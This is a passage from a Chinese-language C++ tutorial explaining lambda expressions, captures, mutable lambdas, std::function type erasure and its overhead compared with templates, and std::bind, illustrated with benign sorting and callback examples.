(Functor):</strong><ul><li>  优点：可以携带状态（通过成员变量），可以内联，类型安全。</li><li>  缺点：需要单独定义一个类，代码相对冗长，特别是对于简单的操作。</li></ul></li><li><strong>Lambda 函数:</strong><ul><li>  优点：语法简洁，可以直接在调用点定义，易于阅读；可以通过捕获子句方便地访问（携带）外部状态；通常可以内联；功能强大灵活。</li><li>  缺点：对于复杂或需要在多处重用的逻辑，单独定义函数或函数对象可能更清晰。</li></ul></li></ul><p><strong>示例对比 (用于 <code>std::sort</code> 的自定义比较):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 使用函数指针</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">compareDescendingPtr</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a &gt; b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 使用函数对象</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CompareDescendingFunctor</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a &gt; b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v = &#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v_copy1 = v;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v_copy2 = v;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v_copy3 = v;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用函数指针排序</span></span><br><span class="line">    <span class="built_in">std</span>::sort(v_copy1.begin(), v_copy1.end(), compareDescendingPtr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用函数对象排序</span></span><br><span class="line">    <span class="built_in">std</span>::sort(v_copy2.begin(), v_copy2.end(), CompareDescendingFunctor());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 Lambda 函数排序</span></span><br><span class="line">    <span class="built_in">std</span>::sort(v_copy3.begin(), v_copy3.end(),</span><br><span class="line">              [](<span class="keyword">int</span> a, <span class="keyword">int</span> b) -&gt; <span class="keyword">bool</span> &#123; <span class="keyword">return</span> a &gt; b; &#125; <span class="comment">// -&gt; bool 可省略</span></span><br><span class="line">             );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sorted (ptr): &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x : v_copy1) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sorted (functor): &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x : v_copy2) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sorted (lambda): &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x : v_copy3) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，Lambda 表达式提供了最简洁的语法，将比较逻辑直接写在了 <code>sort</code> 调用处。</p><h3 id="18-4-2-为何使用-lambda"><a href="#18-4-2-为何使用-lambda" class="headerlink" title="18.4.2 为何使用 lambda"></a>18.4.2 为何使用 lambda</h3><p>Lambda 表达式的主要优势在于其<strong>简洁性</strong>和<strong>局部性</strong>。</p><ol><li><p> <strong>简洁性:</strong> 对于只需要一两行代码的简单操作或谓词，定义一个完整的函数或函数对象类显得过于繁琐。Lambda 允许用非常紧凑的语法直接表达这些逻辑。</p></li><li><p> <strong>局部性:</strong> Lambda 可以直接定义在使用它的地方（例如，作为算法的参数）。这使得代码更易于阅读和理解，因为操作逻辑和调用它的代码紧密地放在一起，不需要跳转到其他地方去查找函数或类的定义。</p></li><li><p> <strong>状态捕获:</strong> Lambda 的捕获机制提供了一种非常方便的方式来访问定义 Lambda 时所处作用域的局部变量，而无需手动将这些变量包装到函数对象中。</p></li></ol><p><strong>示例 (使用捕获):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nums = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> threshold = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; results;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 lambda 查找所有大于 threshold 的数，并复制到 results</span></span><br><span class="line">    <span class="comment">// 捕获 threshold (值拷贝) 和 results (引用)</span></span><br><span class="line">    <span class="built_in">std</span>::for_each(nums.begin(), nums.end(),</span><br><span class="line">                  [threshold, &amp;results](<span class="keyword">int</span> x) &#123;</span><br><span class="line">                      <span class="keyword">if</span> (x &gt; threshold) &#123;</span><br><span class="line">                          results.push_back(x); <span class="comment">// 可以修改引用捕获的 results</span></span><br><span class="line">                          <span class="comment">// threshold = 10; // 编译错误！值捕获的变量默认是 const 的</span></span><br><span class="line">                      &#125;</span><br><span class="line">                  &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Numbers greater than &quot;</span> &lt;&lt; threshold &lt;&lt; <span class="string">&quot;: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> r : results) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; r &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// 输出: 6 7 8 9 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 演示 mutable lambda (允许修改值捕获的变量的副本)</span></span><br><span class="line">    <span class="keyword">int</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">auto</span> mutable_lambda = [counter]() <span class="keyword">mutable</span> &#123; <span class="comment">// 使用 mutable</span></span><br><span class="line">        counter++; <span class="comment">// 现在可以修改 counter 的副本了</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Lambda counter (copy): &quot;</span> &lt;&lt; counter &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    mutable_lambda(); <span class="comment">// 输出 1</span></span><br><span class="line">    mutable_lambda(); <span class="comment">// 输出 2</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original counter: &quot;</span> &lt;&lt; counter &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0 (原始 counter 未变)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 演示引用捕获修改外部变量</span></span><br><span class="line">    <span class="keyword">int</span> external_sum = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">std</span>::for_each(nums.begin(), nums.end(),</span><br><span class="line">                  [&amp;external_sum](<span class="keyword">int</span> x)&#123; <span class="comment">// 引用捕获</span></span><br><span class="line">                      external_sum += x;</span><br><span class="line">                  &#125;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum calculated via lambda: &quot;</span> &lt;&lt; external_sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 55</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>mutable</code> 关键字:</strong> 默认情况下，通过<strong>值捕获</strong>的变量在 Lambda 函数体内部是 <code>const</code> 的，不能被修改。如果你需要在 Lambda 内部修改值捕获变量的<strong>副本</strong>（这种修改不会影响外部原始变量），可以在参数列表 <code>()</code> 之后（或捕获列表 <code>[]</code> 之后，如果没有参数）加上 <code>mutable</code> 关键字。</p><p>Lambda 表达式是现代 C++ 中编写简洁、高效且易读代码的重要工具，尤其是在与 STL 算法结合使用时。</p><h2 id="18-5-包装器"><a href="#18-5-包装器" class="headerlink" title="18.5 包装器"></a>18.5 包装器</h2><p>在 C++ 中，有多种“可调用 (Callable)”的实体：普通函数、函数指针、函数对象（Functors）、Lambda 表达式、类的成员函数指针等。虽然它们都可以被调用，但它们的<strong>类型</strong>各不相同。这在需要存储或传递未知类型的可调用实体时会带来不便。</p><p>例如，你可能想创建一个回调函数列表，列表中的函数可以来自不同的源（有些是普通函数，有些是 Lambda，有些是对象的成员函数），但它们都接受相同的参数并返回相同的类型。如何用一个统一的类型来存储它们呢？</p><p>C++11 在 <code>&lt;functional&gt;</code> 头文件中提供了 <code>std::function</code> 模板类，它是一个通用的、多态的<strong>函数包装器 (Function Wrapper)**。<code>std::function</code> 的对象可以</strong>存储、复制和调用**任何符合其指定函数签名的可调用实体。</p><h3 id="18-5-1-包装器-function"><a href="#18-5-1-包装器-function" class="headerlink" title="18.5.1 包装器 function"></a>18.5.1 包装器 <code>function</code></h3><p><code>std::function</code> 的模板参数是它所要包装的函数的**签名 (Signature)**。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;functional&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::function&lt;ReturnType(ArgType1, ArgType2, ...)&gt; func_wrapper;</span><br></pre></td></tr></table></figure><ul><li>  <code>ReturnType</code>: 被包装函数的返回类型。</li><li>  <code>ArgType1, ArgType2, ...</code>: 被包装函数接受的参数类型列表。</li></ul><p><strong>基本用法:</strong></p><p>你可以将任何具有兼容签名的可调用实体赋值给 <code>std::function</code> 对象。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 普通函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_message</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; msg)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Function Pointer: &quot;</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 函数对象 (Functor)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Printer</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> prefix;</span><br><span class="line">    Printer(<span class="built_in">std</span>::<span class="built_in">string</span> p) : prefix(p) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; msg)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Functor (&quot;</span> &lt;&lt; prefix &lt;&lt; <span class="string">&quot;): &quot;</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 类的成员函数</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Greeter</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">greet</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; name)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Member Function: Hello, &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义一个可以包装 void(const std::string&amp;) 类型函数的 std::function</span></span><br><span class="line">    <span class="built_in">std</span>::function&lt;<span class="keyword">void</span>(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp;)&gt; callback;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// a) 包装普通函数指针</span></span><br><span class="line">    callback = print_message;</span><br><span class="line">    callback(<span class="string">&quot;Hello from function pointer!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// b) 包装 Lambda 表达式</span></span><br><span class="line">    callback = [](<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; msg) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Lambda: &quot;</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    callback(<span class="string">&quot;Hello from lambda!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// c) 包装函数对象</span></span><br><span class="line">    <span class="function">Printer <span class="title">my_printer</span><span class="params">(<span class="string">&quot;LOG&quot;</span>)</span></span>;</span><br><span class="line">    callback = my_printer; <span class="comment">// Functor 对象可以直接赋值</span></span><br><span class="line">    callback(<span class="string">&quot;Hello from functor!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// d) 包装类的成员函数 (需要绑定对象)</span></span><br><span class="line">    Greeter greeter_obj;</span><br><span class="line">    <span class="comment">// 使用 std::bind (或者 Lambda) 来绑定 this 指针</span></span><br><span class="line">    callback = <span class="built_in">std</span>::bind(&amp;Greeter::greet, &amp;greeter_obj, <span class="built_in">std</span>::placeholders::_1);</span><br><span class="line">    <span class="comment">// 或者使用 Lambda 捕获对象</span></span><br><span class="line">    <span class="comment">// callback = [&amp;greeter_obj](const std::string&amp; name)&#123; greeter_obj.greet(name); &#125;;</span></span><br><span class="line">    callback(<span class="string">&quot;Alice&quot;</span>); <span class="comment">// 调用 greeter_obj.greet(&quot;Alice&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查 std::function 是否为空 (是否持有可调用对象)</span></span><br><span class="line">    <span class="keyword">if</span> (callback) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Callback is holding a callable entity.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清空 std::function</span></span><br><span class="line">    callback = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">if</span> (!callback) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Callback is now empty.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 存储不同类型的回调函数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::function&lt;<span class="keyword">void</span>(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp;)&gt;&gt; callbacks;</span><br><span class="line">    callbacks.push_back(print_message);</span><br><span class="line">    callbacks.push_back([](<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; s)&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Another Lambda: &quot;</span> &lt;&lt; s &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;);</span><br><span class="line">    callbacks.push_back(my_printer);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- Calling stored callbacks ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; cb : callbacks) &#123;</span><br><span class="line">        cb(<span class="string">&quot;Test message&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>std::function</code> 通过<strong>类型擦除 (Type Erasure)</strong> 技术实现了这种通用性。它内部可以存储不同类型的可调用对象，并在调用时通过某种机制（通常涉及堆分配和虚函数调用，特别是对于捕获了数据的 Lambda 或大型函数对象）来执行实际的调用。</p><h3 id="18-5-1-续-function-及模板的低效性-潜在开销"><a href="#18-5-1-续-function-及模板的低效性-潜在开销" class="headerlink" title="18.5.1 (续) function 及模板的低效性 (潜在开销)"></a>18.5.1 (续) <code>function</code> 及模板的低效性 (潜在开销)</h3><p>虽然 <code>std::function</code> 非常灵活，但这种灵活性是有代价的：</p><ol><li><p><strong>类型擦除开销:</strong> 为了能够存储任意类型的可调用对象，<code>std::function</code> 通常需要在内部处理类型信息。这可能涉及到：</p><ul><li>  <strong>堆分配:</strong> 如果被包装的可调用对象（特别是带捕获的 Lambda 或函数对象）比较大，或者不能通过“小对象优化 (Small Object Optimization, SOO)”直接存储在 <code>std::function</code> 对象内部，就可能需要在堆上分配内存来存储它。堆分配和释放是有开销的。</li><li>  <strong>间接调用:</strong> 调用存储在 <code>std::function</code> 中的函数通常需要通过指针或虚函数进行间接调用，这比直接函数调用或模板实例化产生的内联调用要慢。</li></ul></li><li><p><strong>相比模板的低效性:</strong> 如果在编译时就知道具体的可调用类型，使用<strong>模板</strong>通常会更高效。模板允许编译器为每种具体的类型生成专门的代码，并且更容易进行内联优化，避免了 <code>std::function</code> 的类型擦除和间接调用开销。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用模板，更高效</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Callable&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_with_template</span><span class="params">(Callable func, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; data)</span> </span>&#123;</span><br><span class="line">    func(data); <span class="comment">// 直接调用，可能内联</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 std::function，更灵活，但可能有开销</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_with_function</span><span class="params">(<span class="built_in">std</span>::function&lt;<span class="keyword">void</span>(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp;)&gt; func, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; data)</span> </span>&#123;</span><br><span class="line">    func(data); <span class="comment">// 间接调用</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> my_lambda = [](<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; s)&#123; <span class="comment">/*...*/</span> &#125;;</span><br><span class="line">    process_with_template(my_lambda, <span class="string">&quot;data&quot;</span>); <span class="comment">// 高效</span></span><br><span class="line">    process_with_function(my_lambda, <span class="string">&quot;data&quot;</span>); <span class="comment">// 灵活，但可能稍慢</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p><strong>何时使用 <code>std::function</code>？</strong></p><ul><li>  当你需要在<strong>运行时</strong>确定要调用哪个函数，或者需要存储<strong>不同类型</strong>的可调用对象在同一个容器中时（如回调系统、事件处理）。</li><li>  当你需要定义一个接受<strong>任何</strong>符合特定签名的可调用对象的接口时。</li></ul><p><strong>何时避免使用 <code>std::function</code> (如果性能是关键)？</strong></p><ul><li>  当你在编译时就知道具体的可调用类型时，优先使用模板或直接调用。</li><li>  在性能极其敏感的代码路径中（如紧密循环内部），需要仔细评估 <code>std::function</code> 带来的开销。</li></ul><h3 id="18-5-2-修复问题-18-5-3-其他方式"><a href="#18-5-2-修复问题-18-5-3-其他方式" class="headerlink" title="18.5.2 修复问题 / 18.5.3 其他方式"></a>18.5.2 修复问题 / 18.5.3 其他方式</h3><p>这里的“修复问题”主要是指理解 <code>std::function</code> 的开销并根据场景选择合适的技术。“其他方式”则包括：</p><ol><li><p> <strong>使用模板:</strong> 如上所述，当类型在编译时已知时，模板是最高效的选择。</p></li><li><p> <strong>使用函数指针:</strong> 对于简单的、无状态的函数，直接使用函数指针类型 <code>ReturnType(*)(ArgTypes...)</code> 仍然是有效的，并且开销很小。</p></li><li><p> <strong>使用 Lambda:</strong> Lambda 本身是高效的（它们是匿名的函数对象）。只有当它们被存储在 <code>std::function</code> 中时，才可能引入 <code>std::function</code> 的开销。如果可以将 Lambda 直接传递给模板化的函数（如 STL 算法），通常不会有额外开销。</p></li><li><p><strong><code>std::bind</code>:</strong> (在 <code>&lt;functional&gt;</code> 中) <code>std::bind</code> 可以用来绑定函数的参数（包括成员函数的 <code>this</code> 指针）或重新排列参数顺序，生成一个新的可调用对象 (函数对象)。虽然 <code>std::bind</code> 也能被 <code>std::function</code> 存储，但现代 C++ 中，Lambda 通常提供了更简洁、更易读的方式来完成类似的任务。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 